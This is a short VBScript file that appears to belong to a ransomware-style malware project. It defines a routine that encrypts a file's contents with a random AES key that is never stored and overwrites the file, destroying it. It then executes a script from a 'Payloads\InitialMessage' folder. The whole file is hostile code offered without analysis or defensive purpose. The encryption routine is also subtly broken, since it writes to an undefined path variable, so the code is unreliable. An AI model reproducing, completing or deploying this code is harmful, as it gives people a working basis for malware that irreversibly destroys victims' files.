dim ws
set ws = createobject("wscript.shell")
ws.currentdirectory = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path

Function ReadFileToString(readfilepath)
    Set fs2 = CreateObject("Scripting.FileSystemObject") 
    Set file = fs2.OpenTextFile(readfilepath, 1, false) 
    ReadFileToString = file.readall 
    file.close 
    set fs2 = nothing 
end Function
Function EncryptFile(fn)
Dim obj,arr,i,r,str,enc,asc
dim bytes,bytesd,s,sc,sd
set obj=WScript.CreateObject("System.Security.Cryptography.RijndaelManaged")
Set asc = CreateObject("System.Text.UTF8Encoding")
s=ReadFileToString(fn)
bytes=asc.GetBytes_4(s)
obj.GenerateKey()
obj.GenerateIV()
set enc=obj.CreateEncryptor()

bytec=enc.TransformFinalBlock((bytes),0,lenb(bytes))
sc=asc.GetString((bytec))
Set fs2 = CreateObject("Scripting.FileSystemObject") 
Set file = fs2.OpenTextFile(readfilepath, 2, false) 
file.Write sc
file.close
set fs2=nothing
end function

function Eval2(vbsFile)
    Execute ReadFileToString(vbsFile)
end function
Eval2 ".\Payloads\InitialMessage\InitialMessage.vbs"

